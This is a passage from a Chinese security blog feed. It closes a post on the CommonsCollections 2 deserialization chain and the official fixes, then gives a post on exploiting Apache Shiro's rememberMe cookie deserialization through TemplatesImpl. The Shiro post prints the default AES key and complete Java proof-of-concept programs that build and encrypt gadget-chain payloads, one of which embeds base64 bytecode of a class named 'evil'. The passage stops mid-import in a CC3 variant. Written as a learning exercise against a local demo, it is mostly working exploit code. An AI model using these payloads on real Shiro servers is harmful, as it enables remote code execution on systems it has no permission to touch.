(Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/07/L8pCRe1qzUY295X.png" alt="image.png"></p><p>成功弹出计算器</p><h2 id="官方修复方法"><a href="#官方修复方法" class="headerlink" title="官方修复方法"></a>官方修复方法</h2><p><code>Apache Commons Collections</code>官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2；先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法<code>FunctorUtils#checkUnsafeSerialization</code>，⽤于检测反序列化是否安全。如果开发者没有设置全局配置<code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会 抛出异常。 这个检查在常⻅的危险<code>Transformer</code>类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code>等的 <code>readObject</code> ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常；再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险<code>Transformer</code>类不再实现 <code>Serializable</code> 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了，更绝</p><p>这篇文章介绍了<code>commons-collections4.0</code>相较于3.2.1的变化，并且介绍了一款新的利用链，这款利用链只能在4.0的版本中工作，它就是<code>CommonsCollections 2</code>，还有官方对cc链的修复方法</p><p>这是p神Java安全漫谈中最后一篇关于<code>CommonsCollections</code>利用链的文章，再次感谢p神写出这么精彩的文章，还有没讲到的4、5、7我就自己琢磨琢磨吧，应该也问题不大，看了这么多天的cc链，其实原理也都是相通的</p><p>加油吧 Java安全 路还长着呢</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-2&quot;&gt;&lt;a href=&quot;#Commons-Collections-2&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 2&quot;&gt;&lt;/a&gt;Commons Collections 2&lt;/h1&gt;&lt;p&gt;前面我们讲的cc链，都是基于&lt;code&gt;commons-collections:commons-collections&lt;/code&gt;这个版本的，当时的版本号是3.2.1，也就是老版本；但后来实际上又有了新的分支，版本号为4.0，接下来我们就来看看在这个版本中存在的反序列化漏洞&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之利用TemplatesImpl攻击Shiro</title>
    <link href="https://arsenetang.github.io/2022/03/03/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8TemplatesImpl%E6%94%BB%E5%87%BBShiro/"/>
    <id>https://arsenetang.github.io/2022/03/03/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8TemplatesImpl%E6%94%BB%E5%87%BBShiro/</id>
    <published>2022-03-02T16:00:00.000Z</published>
    <updated>2022-03-03T12:58:23.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用TemplatesImp攻击Shiro"><a href="#利用TemplatesImp攻击Shiro" class="headerlink" title="利用TemplatesImp攻击Shiro"></a>利用TemplatesImp攻击Shiro</h1><p>这篇文章虽然写的是攻击Shiro，但实际上跟shiro关系不算特别大，主要是利用<code>TemplatesImpl</code>构造一条cc的链子，其实我们都已经有<code>CommonsCollections6</code>这样可以通杀的利用链了，那么为什么还需要<code>TemplatesImpl</code>这种呢？因为<code>TemplatesImpl</code>理论上是可以执行任意Java代码的，通用性非常高</p><span id="more"></span><h2 id="Shiro反序列化是什么"><a href="#Shiro反序列化是什么" class="headerlink" title="Shiro反序列化是什么"></a>Shiro反序列化是什么</h2><p>其实我对Shiro也不是很了解，硬着头皮来写这篇文章，但这不影响来理解Shiro反序列化的原理，因为它的原理其实挺简单的：为了让浏览器或服务器重启后用户<strong>不丢失登录状态</strong>，Shiro支持将<strong>持久化信息序列化</strong>并加密后<strong>保存在Cookie的rememberMe字段中</strong>，下次读取时进行<strong>解密再反序列化</strong>；照理说加密过后应该是很安全的，但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的代码，然后放入<code>Cookie</code>的<code>rememberMe</code>字段中，进而触发反序列化漏洞</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里因为需要用到<code>Shiro</code>登录啥的，所以说还是需要一个简单的环境的，还好p神帮我们都搞好了，这里必须说p神yyds，没有他这个Java安全是真的难学，给出p神项目的地址：&lt;<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">JavaThings/shirodemo at master · phith0n/JavaThings · GitHub</a>&gt;，直接把文件夹<code>shirodemo</code>下载下来用idea打开就好了，这里需要进行个<code>maven</code>换源，网上找一个就行，然后我就遇到了个很坑的问题，因为我的本地仓库是在c盘的，所以说非管理员用户是没有修改权限的，这里是真的坑，所以说需要修改权限的，还好找到了篇好文章，如下图：</p><p><img src="https://s2.loli.net/2022/03/02/jUlfC2G7tXHu6Qk.png" alt="image.png"></p><p>成功解决，然后用<code>mvn package</code>将这个项目打包成<code>war</code>包，放到<code>Tomcat</code>的webapps目录下，然后打开Tomcat，访问<code>http://localhost:8080/shirodemo/</code>，就可以跳转到登录页面了：</p><p><img src="https://s2.loli.net/2022/03/02/OTiyh1oUKArkM2q.png" alt="image.png"></p><p>输入正确的账号密码：root/secret，就可以成功登录，这里我们抓个包，记得勾选<code>Remember me</code></p><p><img src="https://s2.loli.net/2022/03/02/nYsPWmIK7yMOdTG.png" alt="image.png"></p><p>可以看到服务器返回了我们一个<code>rememberMe</code>的<code>Cookie</code>，肯定是加密过的</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>因为<code>Shiro</code>对<code>Cookie</code>的处理方式是先将其<code>base64</code>解码，然后再<code>AES</code>解码，最后进行反序列化；所以说我们要构造<code>payload</code>的顺序就是先<code>    AES</code>加密，然后<code>Base64</code>加密，再进行序列化就行，所以说其实构造的核心就是找到<code>AES</code>的密钥，而且shiro 1.2.4之前密钥是默认的，这就让<code>Shiro</code>反序列化的利用难度瞬间降低，而默认的密钥在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h2><p>那我们接下来我们就来写POC了，这里我们先用cc6的链子试试吧，前面的代码和cc6是一样的，大家可以参考我前面的文章，这里主要是要写一个加密，在shiro类中有一个内置类<code>AesCipherService</code>，这个类中有一个<code>encrypt</code>方法，只要告诉它明文和密钥它就可以直接加密了，这里我就直接写在主函数里面了，可能要方便理解一点儿吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line">        Transformer[] fakeTransformers=<span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        Field trans=ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        trans.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        trans.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密的代码在最下面，这里的内容如果看不太懂的话，建议回去复习一下前面的内容哦</p><p>运行这一段代码，它就会生成一段base64字符串，直接用这段poyload放burp里去打，发送给shiro</p><p><img src="https://s2.loli.net/2022/03/03/d7lTfmF6WA23gMJ.png" alt="image.png"></p><p>咦，并没有弹出计算器，而且这时候去看<code>Tomcat</code>，还有报错：</p><p><img src="https://s2.loli.net/2022/03/03/D6g5AKoJQmnpIxZ.png" alt="image.png"></p><h2 id="异常分析"><a href="#异常分析" class="headerlink" title="异常分析"></a>异常分析</h2><p>那么为什么会出现这个异常呢？其实这问题我也不算特别了解，因为我对Shiro也不算很熟，但是这里得报错内容是：<code>Unable to load class named [[Lorg.apache.commons.collections.Transformer;]</code>，意思是说不能加载<code>Transform[]</code>数组，原因我就不太清楚了，这里直接给出p神的结论：<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</strong>这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h2 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h2><p>所以说，咱现在得想办法不用<code>Transform[]</code>数组，这时候我们就应该想到前面用<code>TemplatesImpl</code>构造的cc3的链子，这里我们还是使用<code>InvokerTransformer</code>，其中的数组只有两个元素，复习复习代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个数组虽然说只有两个元素，但它好歹也算个数组呀，还是不符合条件，那我们就得想办法去掉这个数组中的一个元素，那么不就可以了？后面那个执行命令的<code>InvokerTransformer</code>肯定是没办法去掉的，但是前面那个用来返回对象的<code>ConstantTransformer</code>，我们有没有机会去掉呢？继续往下看哈</p><p>我们先来回顾一下<code>InvokerTransformer</code>类中的<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，它执行的是<code>input</code>对象中的<code>iMethodName</code>方法，而前面我们是通过<code>ConstantTransformer</code>将对象传进来的，那这里我们能不能直接传呢，接着往前看，看看<code>LazyMap</code>中的<code>get</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里很惊奇的发现，这个<code>key</code>，居然被当作参数传了进去，<code>this.factory.transform(key)</code>，那么假如这个key就是前面我们想要通过<code>ConstantTransformer</code>传进来的对象，那我们不就可以执行这个对象中的方法了吗，简直是太妙了哈哈哈</p><p>那么我们就可以去掉前面那个<code>new ConstantTransformer(obj)</code>了，这样子数据中的元素个数也就降为1了，也就不用数组了，而且由于只有一个了，连<code>ChainedTransformer</code>都用不着了</p><h2 id="InvokerTransformer版-cc6"><a href="#InvokerTransformer版-cc6" class="headerlink" title="InvokerTransformer版(cc6)"></a>InvokerTransformer版(cc6)</h2><p>接下来我们看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getClass&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap,obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme,<span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实挺好理解的吧，就是在构造<code>TiedMapEntry</code>的时候把<code>obj</code>对象传进去，传在<code>key</code>的位置上就好了，还是先传入一 个人畜无害的方法，比如<code>getClass</code> ，避免恶意方法在构造Gadget的时候触发，最后，将<code>InvokerTransformer</code>的方法从人畜无害的<code>getClass</code>，改成 <code>newTransformer </code>，就搞定了，运行它得到base64字符串，直接去打：</p><p><img src="https://s2.loli.net/2022/03/03/kXfwzFvt9ocmEl7.png" alt="image.png"></p><p>弹出计算器，完美，这个算是cc6的链子，因为用了<code>InvokerTransformer</code>，接下来看看cc3的链子</p><h2 id="InstantiateTransformer版-cc3"><a href="#InstantiateTransformer版-cc3" class="headerlink" title="InstantiateTransformer版(cc3)"></a>InstantiateTransformer版(cc3)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> 